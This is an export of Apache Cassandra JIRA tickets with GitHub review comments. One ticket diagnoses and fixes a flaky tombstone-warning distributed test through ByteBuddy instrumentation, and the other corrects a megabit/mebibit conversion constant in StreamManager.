test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -248,7 +274,10 @@ public boolean matches(InetAddress value)
 
         assertWarnAborts(0, 2, 1);
 
+        // when disabled warnings only happen if on the coordinator, and coordinator may not be the one replying
+        // to every query
         enable(false);
+        State.blockFor(CLUSTER.get(1).config().broadcastAddress());

Review Comment:
   honestly `driverQueryAll(cql)` below could use the same, but for some reason its stable where as this wasn't...



;03/Jun/22 16:13;githubbot;600","dcapwell commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889120809


##########
test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -259,7 +288,12 @@ public boolean matches(InetAddress value)
             catch (ReadFailureException e)
             {
                 Assertions.assertThat(e).isNotInstanceOf(TombstoneAbortException.class);
+                Assertions.assertThat(e.failureReasonByEndpoint).isNotEmpty();
+                Assertions.assertThat(e.failureReasonByEndpoint.values())
+                          .as(""Non READ_TOO_MANY_TOMBSTONES exists"")
+                          .allMatch(RequestFailureReason.READ_TOO_MANY_TOMBSTONES::equals);

Review Comment:
   this is just for consistency; we do this in the above queries so why not here?



;03/Jun/22 16:13;githubbot;600","dcapwell commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889121315


##########
test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -327,4 +361,75 @@ private static ResultSet driverQueryAll(String cql)
     {
         return JAVA_DRIVER_SESSION.execute(new SimpleStatement(cql).setConsistencyLevel(com.datastax.driver.core.ConsistencyLevel.ALL));
     }
+
+    @Shared
+    public static class State
+    {
+        public static volatile InetSocketAddress blockFor = null;
+        public static volatile CompletableFuture<Void> promise = new CompletableFuture<>();

Review Comment:
   could be `null`... I just hate nulls ^_^



;03/Jun/22 16:14;githubbot;600","maedhroz commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889201338


##########
test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -327,4 +361,78 @@ private static ResultSet driverQueryAll(String cql)
     {
         return JAVA_DRIVER_SESSION.execute(new SimpleStatement(cql).setConsistencyLevel(com.datastax.driver.core.ConsistencyLevel.ALL));
     }
+
+    @Shared
+    public static class State
+    {
+        // use InetSocketAddress as InetAddressAndPort is @Isolated which means equality doesn't work due to different
+        // ClassLoaders; InetSocketAddress is @Shared so safe to use between app and cluster class loaders
+        public static volatile InetSocketAddress blockFor = null;
+        public static volatile CompletableFuture<Void> promise = new CompletableFuture<>();
+
+        // called on main thread
+        public static void blockFor(InetSocketAddress address)
+        {
+            blockFor = address;
+            promise = new CompletableFuture<>();
+        }
+
+        // called in C* threads; non-test threads
+        public static void onFailure(InetSocketAddress address)
+        {
+            if (address.equals(blockFor))
+                promise.complete(null);
+        }
+
+        // called on main thread
+        public static void syncAndClear()
+        {
+            if (blockFor != null)
+            {
+                promise.join();
+                blockFor = null;
+            }
+        }
+    }
+
+    public static class BB
+    {
+        private static void install(ClassLoader cl, int instanceId)
+        {
+            if (instanceId != 1)
+                return;
+            new ByteBuddy().rebase(ReadCallback.class)
+                           .method(named(""awaitResults""))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .method(named(""onFailure""))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+            new ByteBuddy().rebase(SEPExecutor.class)
+                           .method(named(""maybeExecuteImmediately""))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static void awaitResults(@SuperCall Runnable zuper)
+        {
+            State.syncAndClear();
+            zuper.run();
+        }
+
+        public static void onFailure(InetAddressAndPort from, RequestFailureReason failureReason, @SuperCall Runnable zuper) throws Exception
+        {
+            State.onFailure(new InetSocketAddress(from.getAddress(), from.getPort()));
+            zuper.run();
+        }
+
+        // make sure to schedule the task rather than running inline...
+        // this is imporant as the read may block on the local version which can get the test to include it rather than
+        // block waiting, so by scheduling we make sure its always fair
+        public static void maybeExecuteImmediately(Runnable task, @This SEPExecutor executor)

Review Comment:
   nit: throw an `@SuppressWarnings(""unused"")` on this method if you're OCD like me about IDEA's compile warnings :D



;03/Jun/22 17:51;githubbot;600","maedhroz commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889215882


##########
test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -327,4 +361,75 @@ private static ResultSet driverQueryAll(String cql)
     {
         return JAVA_DRIVER_SESSION.execute(new SimpleStatement(cql).setConsistencyLevel(com.datastax.driver.core.ConsistencyLevel.ALL));
     }
+
+    @Shared
+    public static class State
+    {
+        public static volatile InetSocketAddress blockFor = null;
+        public static volatile CompletableFuture<Void> promise = new CompletableFuture<>();

Review Comment:
   I guess the benefit of it starting out `null` would be that, if it must be set in `blockFor()`, null would alert us immediately if we had failed to do that? (...or aesthetically, we return it to `null` in `syncAndClear()`, so why not here?)



;03/Jun/22 18:12;githubbot;600","dcapwell commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889343533


##########
test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -327,4 +361,78 @@ private static ResultSet driverQueryAll(String cql)
     {
         return JAVA_DRIVER_SESSION.execute(new SimpleStatement(cql).setConsistencyLevel(com.datastax.driver.core.ConsistencyLevel.ALL));
     }
+
+    @Shared
+    public static class State
+    {
+        // use InetSocketAddress as InetAddressAndPort is @Isolated which means equality doesn't work due to different
+        // ClassLoaders; InetSocketAddress is @Shared so safe to use between app and cluster class loaders
+        public static volatile InetSocketAddress blockFor = null;
+        public static volatile CompletableFuture<Void> promise = new CompletableFuture<>();
+
+        // called on main thread
+        public static void blockFor(InetSocketAddress address)
+        {
+            blockFor = address;
+            promise = new CompletableFuture<>();
+        }
+
+        // called in C* threads; non-test threads
+        public static void onFailure(InetSocketAddress address)
+        {
+            if (address.equals(blockFor))
+                promise.complete(null);
+        }
+
+        // called on main thread
+        public static void syncAndClear()
+        {
+            if (blockFor != null)
+            {
+                promise.join();
+                blockFor = null;
+            }
+        }
+    }
+
+    public static class BB
+    {
+        private static void install(ClassLoader cl, int instanceId)
+        {
+            if (instanceId != 1)
+                return;
+            new ByteBuddy().rebase(ReadCallback.class)
+                           .method(named(""awaitResults""))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .method(named(""onFailure""))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+            new ByteBuddy().rebase(SEPExecutor.class)
+                           .method(named(""maybeExecuteImmediately""))
+                           .intercept(MethodDelegation.to(BB.class))
+                           .make()
+                           .load(cl, ClassLoadingStrategy.Default.INJECTION);
+        }
+
+        public static void awaitResults(@SuperCall Runnable zuper)
+        {
+            State.syncAndClear();
+            zuper.run();
+        }
+
+        public static void onFailure(InetAddressAndPort from, RequestFailureReason failureReason, @SuperCall Runnable zuper) throws Exception
+        {
+            State.onFailure(new InetSocketAddress(from.getAddress(), from.getPort()));
+            zuper.run();
+        }
+
+        // make sure to schedule the task rather than running inline...
+        // this is imporant as the read may block on the local version which can get the test to include it rather than
+        // block waiting, so by scheduling we make sure its always fair
+        public static void maybeExecuteImmediately(Runnable task, @This SEPExecutor executor)

Review Comment:
   you and your warnings!  



;03/Jun/22 20:56;githubbot;600","dcapwell commented on code in PR #1663:
URL: https://github.com/apache/cassandra/pull/1663#discussion_r889350008


##########
test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java:
##########
@@ -327,4 +361,75 @@ private static ResultSet driverQueryAll(String cql)
     {
         return JAVA_DRIVER_SESSION.execute(new SimpleStatement(cql).setConsistencyLevel(com.datastax.driver.core.ConsistencyLevel.ALL));
     }
+
+    @Shared
+    public static class State
+    {
+        public static volatile InetSocketAddress blockFor = null;
+        public static volatile CompletableFuture<Void> promise = new CompletableFuture<>();

Review Comment:
   I went with null



;03/Jun/22 21:05;githubbot;600","smiklosovic closed pull request #1663: CASSANDRA-17244: Fix org.apache.cassandra.distributed.test.trackwarnings.TombstoneCountWarningTest.failThresholdSinglePartition
URL: https://github.com/apache/cassandra/pull/1663


;17/Jun/22 07:28;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Jun 03 21:51:14 UTC 2022,,,,,,,All,,,,"0|z0ydww:",9223372036854775807,,,,maedhroz,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/d3ce825bf2b376fd2516e4b594ddb69037c13159,,,,,,,,,ran multiple times,,,,,"09/Feb/22 05:04;azotcsit;It failed in [928|https://ci-cassandra.apache.org/job/Cassandra-trunk/928/testReport/org.apache.cassandra.distributed.test.trackwarnings/TombstoneCountWarningTest] and [935|https://ci-cassandra.apache.org/job/Cassandra-trunk/935/testReport/org.apache.cassandra.distributed.test.trackwarnings/TombstoneCountWarningTest/failThresholdSinglePartition/] builds.
{code:java}
java.lang.NullPointerException
	at com.google.common.collect.Iterables.getOnlyElement(Iterables.java:254)
	at org.apache.cassandra.distributed.test.trackwarnings.TombstoneCountWarningTest.failThreshold(TombstoneCountWarningTest.java:273)
	at org.apache.cassandra.distributed.test.trackwarnings.TombstoneCountWarningTest.failThresholdSinglePartition(TombstoneCountWarningTest.java:186)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) {code}
Looks like sometimes warnings can be unexpectedly empty. I'm not really familiar with all these classes and test utilities, however, I have a guess that it somehow maybe related to the fact which node really acts as a coordinator for
{code:java}
QueryProcessor.execute(cql, org.apache.cassandra.db.ConsistencyLevel.ALL, QueryState.forInternalCalls()); {code}
command. With that idea in mind, I feel we may need to introduce CoordinatorWarning init/done/reset logic as it was done in [https://github.com/apache/cassandra/pull/1180/files#diff-e14e42b9f28baf531cfe0fd4d79794617959d63e26e03bed54e0e1636e55d890R200.] But this is a pure speculation because I do not really understand the whole logic :) I hope [~dcapwell] can comment on this.

If it does not seem to be the right direction I'd postpone working on this ticket because I have a bunch of other test failures on Jenkins to take a look to.;;;","09/Feb/22 08:59;azotcsit;I linked the failed tests in Butler with this ticket. Here is the detailed log from 935 build:

https://ci-cassandra.apache.org/job/Cassandra-trunk-jvm-dtest/1072/jdk=jdk_11_latest,label=cassandra,split=1/consoleFull;;;","02/Mar/22 18:35;adelapena;[This run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1327/workflows/05d20d1b-aa29-49e8-bfe6-47cf6ec3fbe9/jobs/13068] with 200 iterations of {{failThresholdSinglePartition}} passes. However, [this other run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1328/workflows/23d7dc1e-4230-473b-bd0c-19d0e180b673/jobs/13070] of the entire suite hits the NPE four times.;;;","20/Apr/22 19:37;e.dimitrova;I saw it again today https://jenkins-cm4.apache.org/job/Cassandra-trunk/1088/testReport/junit/org.apache.cassandra.distributed.test.trackwarnings/TombstoneCountWarningTest/failThresholdSinglePartition/;;;","01/Jun/22 15:03;e.dimitrova;Hey, [~dcapwell] (sorry, I am super annoying today :(), but did you have the chance to look at what [~azotcsit] mentioned?;;;","02/Jun/22 18:56;dcapwell;sorry, didn't see this till you poked me... looking into it;;;","02/Jun/22 19:02;dcapwell;{code}
public List<String> getWarnings()
    {
        State state = get();
        if (state == null || state.warnings.isEmpty())
            return null;
        return state.warnings;
    }
{code}

so state is null or no warnings we get a null, which is unexpected in this case... we do know we hit TombstoneAbortException (else we would has AssertionError), so we know 

{code}
tombstones.aborts.instances.isEmpty() == false
{code}

so org.apache.cassandra.service.reads.thresholds.CoordinatorWarnings#recordAborts should add this warning

{code}
String msg = toString.apply(counter.aborts.instances.size(), counter.aborts.maxValue, cql);
ClientWarn.instance.warn(msg + "" with "" + loggableTokens);
{code}

which we should be able to see in logs... will try to see if any builds exist still with logs to confirm;;;","02/Jun/22 19:09;dcapwell;all logs lost at this point, rerunning https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci%2Ftrunk&filter=all;;;","02/Jun/22 19:37;dcapwell;repo: https://app.circleci.com/pipelines/github/dcapwell/cassandra/1508/workflows/fee86131-b84b-4863-8808-9d8c7beb7d92/jobs/12619

issue is there are too many tests and no good log showing where the test starts... added logging and trying again;;;","02/Jun/22 19:58;dcapwell;Ok here is what I am seeing

{code}
java.lang.NullPointerException
	at com.google.common.collect.Iterables.getOnlyElement(Iterables.java:254)
	at org.apache.cassandra.distributed.test.thresholds.TombstoneCountWarningTest.failThreshold(TombstoneCountWarningTest.java:287)
	at org.apache.cassandra.distributed.test.thresholds.TombstoneCountWarningTest.failThresholdSinglePartition(TombstoneCountWarningTest.java:199)
{code}

which maps to this code

{code}
enable(false);
        warnings = CLUSTER.get(1).callsOnInstance(() -> {
            ClientWarn.instance.captureWarnings();
            try
            {
                QueryProcessor.execute(cql, org.apache.cassandra.db.ConsistencyLevel.ALL, QueryState.forInternalCalls());
                Assert.fail(""Expected query failure"");
            }
            catch (ReadFailureException e)
            {
                Assertions.assertThat(e).isNotInstanceOf(TombstoneAbortException.class);
            }
            return ClientWarn.instance.getWarnings();
        }).call();
        // client warnings are currently coordinator only, so if present only 1 is expected
        if (isScan)
        {
            // Scans perform multiple ReadCommands, which will not propgate the warnings to the top-level coordinator; so no warnings are expected
            Assertions.assertThat(warnings).isNull();
        }
        else
        {
            Assertions.assertThat(Iterables.getOnlyElement(warnings))
                      .startsWith(""Read "" + TOMBSTONE_FAIL + "" live rows and "" + (TOMBSTONE_FAIL + 1) + "" tombstone cells for query "" + cql);
        }
{code}

So track warnings is no longer active, and we are validating that old tombstone warning was present... which is done here org/apache/cassandra/db/ReadCommand.java:493.onClose

{code}
boolean warnTombstones = tombstones > warningThreshold && respectTombstoneThresholds;
                if (warnTombstones)
                {
                    String msg = String.format(
                            ""Read %d live rows and %d tombstone cells for query %1.512s; token %s (see tombstone_warn_threshold)"",
                            liveRows, tombstones, ReadCommand.this.toCQLString(), currentKey.getToken());
                    if (trackWarnings)
                        MessageParams.add(ParamType.TOMBSTONE_WARNING, tombstones);
                    else
                        ClientWarn.instance.warn(msg);
                    if (tombstones < failureThreshold)
                    {
                        metric.tombstoneWarnings.inc();
                    }

                    logger.warn(msg);
                }
{code}

based off logs I see the following

{code}
WARN  [ReadStage-1] node2 2022-06-02 19:41:29,697 ReadCommand.java:592 - Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
WARN  [ReadStage-1] node3 2022-06-02 19:41:29,701 ReadCommand.java:592 - Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
WARN  [ReadStage-1] node1 2022-06-02 19:41:29,701 ReadCommand.java:592 - Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
{code}

so every node saw tombstone warnings, so coordinator should which should bubble up to the user... but didn't?

Full logs for this section of code

{code}
INFO  [node1_isolatedExecutor:2] node1 2022-06-02 19:41:29,690 DatabaseDescriptor.java:3992 - updated read_thresholds_enabled to false
INFO  [node2_isolatedExecutor:2] node2 2022-06-02 19:41:29,691 DatabaseDescriptor.java:3992 - updated read_thresholds_enabled to false
INFO  [node3_isolatedExecutor:1] node3 2022-06-02 19:41:29,691 DatabaseDescriptor.java:3992 - updated read_thresholds_enabled to false
WARN  19:41:29 Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
WARN  [ReadStage-1] node2 2022-06-02 19:41:29,697 ReadCommand.java:592 - Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
ERROR 19:41:29 Scanned over 101 tombstones during query 'SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING' (last scanned row token was -4069959284402364209 and partion key was ((1), 100)); query aborted
ERROR [ReadStage-1] node2 2022-06-02 19:41:29,697 NoSpamLogger.java:111 - Scanned over 101 tombstones during query 'SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING' (last scanned row token was -4069959284402364209 and partion key was ((1), 100)); query aborted
DEBUG [node1_isolatedExecutor:2] node1 2022-06-02 19:41:29,700 ReadCallback.java:146 - Failed; received 0 of 3 responses
WARN  19:41:29 Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
WARN  [ReadStage-1] node3 2022-06-02 19:41:29,701 ReadCommand.java:592 - Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
ERROR 19:41:29 Scanned over 101 tombstones during query 'SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING' (last scanned row token was -4069959284402364209 and partion key was ((1), 100)); query aborted
ERROR [ReadStage-1] node3 2022-06-02 19:41:29,701 NoSpamLogger.java:111 - Scanned over 101 tombstones during query 'SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING' (last scanned row token was -4069959284402364209 and partion key was ((1), 100)); query aborted
WARN  19:41:29 Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
WARN  [ReadStage-1] node1 2022-06-02 19:41:29,701 ReadCommand.java:592 - Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold)
ERROR 19:41:29 Scanned over 101 tombstones during query 'SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING' (last scanned row token was -4069959284402364209 and partion key was ((1), 100)); query aborted
ERROR [ReadStage-1] node1 2022-06-02 19:41:29,701 StorageProxy.java:2148 - Scanned over 101 tombstones during query 'SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING' (last scanned row token was -4069959284402364209 and partion key was ((1), 100)); query aborted
{code};;;","02/Jun/22 20:01;dcapwell;based off logs we can confirm we did call org.apache.cassandra.service.ClientWarn#warn yet the coordinator thread sees that it is empty!  This feels like a concurrency bug with ClientWarn?  is trackWarnings=true for some reason?;;;","02/Jun/22 20:19;dcapwell;updated logging shows trackWarning=false so we called ClientWarn.warn

{code}
WARN  [ReadStage-3] node1 2022-06-02 20:13:56,267 ReadCommand.java:592 - Read 100 live rows and 101 tombstone cells for query SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING; token -4069959284402364209 (see tombstone_warn_threshold); trackWarnings=false
ERROR [ReadStage-3] node1 2022-06-02 20:13:56,267 StorageProxy.java:2148 - Scanned over 101 tombstones during query 'SELECT * FROM distributed_test_keyspace.tbl WHERE pk = 1 ALLOW FILTERING' (last scanned row token was -4069959284402364209 and partion key was ((1), 100)); query aborted
{code}

So this feels like a ClientWarn bug...;;;","03/Jun/22 00:14;dcapwell;with enough hacks was able to verify that its a timing bug...  node1 (coordinator) works when the Read executor has task permits to allow running in the current thread (isolated executor... coordinator blocks on local read), but when it doesn't and needs to schedule it, it may see the error after the coordinator already replied back to the user that the query failed... I have a patch to do class rewriting so we block on node1 response...;;;","03/Jun/22 19:21;dcapwell;To repo the original issue, apply the following patch

{code}
diff --git a/test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java b/test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java
index a5ebee9cb9..e5c20ea789 100644
--- a/test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java
+++ b/test/distributed/org/apache/cassandra/distributed/test/thresholds/TombstoneCountWarningTest.java
@@ -26,6 +26,7 @@ import java.util.Arrays;
 import java.util.Collections;
 import java.util.List;
 import java.util.concurrent.CompletableFuture;
+import java.util.concurrent.TimeUnit;
 import java.util.function.Consumer;
 
 import com.google.common.collect.ImmutableSet;
@@ -373,8 +374,8 @@ public class TombstoneCountWarningTest extends TestBaseImpl
         // called on main thread
         public static void blockFor(InetSocketAddress address)
         {
-            blockFor = address;
-            promise = new CompletableFuture<>();
+//            blockFor = address;
+//            promise = new CompletableFuture<>();
         }
 
         // called in C* threads; non-test threads
@@ -423,7 +424,9 @@ public class TombstoneCountWarningTest extends TestBaseImpl
 
         public static void onFailure(InetAddressAndPort from, RequestFailureReason failureReason, @SuperCall Runnable zuper) throws Exception
         {
-            State.onFailure(new InetSocketAddress(from.getAddress(), from.getPort()));
+            if (from.getAddress().getHostAddress().equals(""127.0.0.1""))
+                TimeUnit.MINUTES.sleep(10);
+//            State.onFailure(new InetSocketAddress(from.getAddress(), from.getPort()));
             zuper.run();
         }
{code};;;","03/Jun/22 19:26;maedhroz;+1 (just left a couple nits);;;","03/Jun/22 21:05;dcapwell;fixed all nits and made sure driver also blocks on node1 to be stable;;;","03/Jun/22 21:05;dcapwell;working on 4.1 patch now;;;","03/Jun/22 21:51;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17244-cassandra-4.1-B6879A2D-E808-4ECA-9A66-7C798F87CD2B]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17244-cassandra-4.1-B6879A2D-E808-4ECA-9A66-7C798F87CD2B]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1758/]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17244-trunk-B6879A2D-E808-4ECA-9A66-7C798F87CD2B]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17244-trunk-B6879A2D-E808-4ECA-9A66-7C798F87CD2B]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1759/]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix BYTES_PER_MEGABIT in StreamManager,CASSANDRA-17243,13421374,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,e.dimitrova,e.dimitrova,07/Jan/22 18:22,27/May/22 19:25,13/Jul/23 08:40,26/Jan/22 11:57,3.0.26,3.11.12,4.0.2,4.1,4.1-alpha1,,Consistency/Streaming,,,,0,,"While working on CASSANDRA-15234 I noticed BYTES_PER_MEGABIT constant in the 
{code:java}
StreamManager
{code}
 class. It was introduced in CASSANDRA-16959.
The current formula converts actually bytes to mebibits. 

The change needed for 3.0, 3.11 and 4.0(I am currently changing rate parameters to be in MiB/s for trunk as part of CASSANDRA-15234):

{code:java}
public static final double BYTES_PER_MEGABIT = (1000 * 1000) / 8; // from bits
{code}


CC [~adelapena]
",,adelapena,bereng,e.dimitrova,,,,,,,,,,,,"smiklosovic closed pull request #1402:
URL: https://github.com/apache/cassandra/pull/1402


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:28;githubbot;600","smiklosovic closed pull request #1401:
URL: https://github.com/apache/cassandra/pull/1401


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:28;githubbot;600","smiklosovic closed pull request #1399:
URL: https://github.com/apache/cassandra/pull/1399


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:28;githubbot;600","smiklosovic closed pull request #1400:
URL: https://github.com/apache/cassandra/pull/1400


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:28;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,2400,,,0,2400,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-15234,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jan 26 11:54:55 UTC 2022,,,,,,,All,,,,"0|z0yd4w:",9223372036854775807,,,,bereng,,,,Normal,,2.0 beta 1,,https://github.com/apache/cassandra/commit/40bf53359cae0805a978113a9e3156b168b48b14,,,,,,,,,CI runs included,,,,,"12/Jan/22 13:29;adelapena;Very good catch. Indeed the mistake of confusing megabits with mebibits was originally introduced by CASSANDRA-5286, back in 2.0, and it has been overlooked by multiple fixes around that calculation.

The straightforward fix is simply the one mentioned by [~e.dimitrova]:
||PR||CI||
|[3.0|https://github.com/apache/cassandra/pull/1399]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1236/workflows/e3c3a592-4be7-4bab-8ced-ec6719e78a18]|
|[3.11|https://github.com/apache/cassandra/pull/1400]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1235/workflows/679af579-50d6-46b5-a5cb-9bf4b3986cc6]|
|[4.0|https://github.com/apache/cassandra/pull/1401]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1238/workflows/c8981fa3-5770-4970-beee-1bc44f3b04b8] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1238/workflows/27fbf649-60d5-4d8f-b6bf-0a0055fe8917]|
|[trunk|https://github.com/apache/cassandra/pull/1402]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1237/workflows/0805970f-2358-40f9-87c7-ac429c979c08] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1237/workflows/91b1bec3-8bac-4771-9597-64546d7a6100]|

The CI runs above contain some repeated runs of {{{}StreamManagerTest{}}}. Any test is going to be based on the definition of a megabit, so I don't know if we can add a new test for this.
 ;;;","12/Jan/22 13:47;e.dimitrova;Oh, indeed you are right it dates earlier than CASSANDRA-16959. 

Thinking more about it I am wondering whether it won't change a bit behavior then and which branches to target for the fix. 

Also, pre-4.0 we don't have _SetGetStreamThroughputTest_ which caught for me a precision issue with CASSANDRA-15234 that _StreamManagerTest_ missed. But I don't think this will be an issue here as 1000 * 1000 / 8 gives an integer result. More of a concern to me is the change of the rate limit.  On the other hand it is a correctness issue...

I want to think of it a bit more on my end.;;;","13/Jan/22 13:11;adelapena;{quote}Thinking more about it I am wondering whether it won't change a bit behavior then and which branches to target for the fix.  
{quote}
Good point. Changing the meaning of the streaming throughput properties will mean that users don't updating their config will get a throughput ~4.6% lower on streaming. I guess that might be a problem for users that have experimentally fine-tuned those throughput values, although I'm not sure how likely is that to happen.

Maybe we could apply the fix only to trunk, since that kind of performance tuning should be repeated at least in new minors such as 4.1, given that new releases can have performance differences.;;;","13/Jan/22 13:22;brandon.williams;I think it'd be strange to have the setting actually mean different things based on major version.  The difference is small though, I think we could just change it and add a NEWS.txt entry about it?  Nobody's house will burn down if they miss it and take a 4.6% hit, and it's trivially solvable if that happens.;;;","13/Jan/22 17:21;adelapena;Yep, I also think that the difference in throughput is pretty small and unlikely to have an impact in practice. Probably adding that NEWS.txt entry is enough to cover those hypothetical cases where that could be a problem, while achieving correctness in all branches.;;;","13/Jan/22 20:56;e.dimitrova;I am all in to fix correctness issues, I just wanted to be sure we consider the changed behavior. As you two have spent way more time than me with Cassandra in production I will trust your judgement in regards to which versions should be fixed. I definitely agree we have to update NEWS.txt for users' awareness. Thank you!;;;","14/Jan/22 12:14;adelapena;I have just added this entry to NEWS.txt in all branches:
{code:java}
The config properties for setting the streaming throughput `stream_throughput_outbound_megabits_per_sec` and
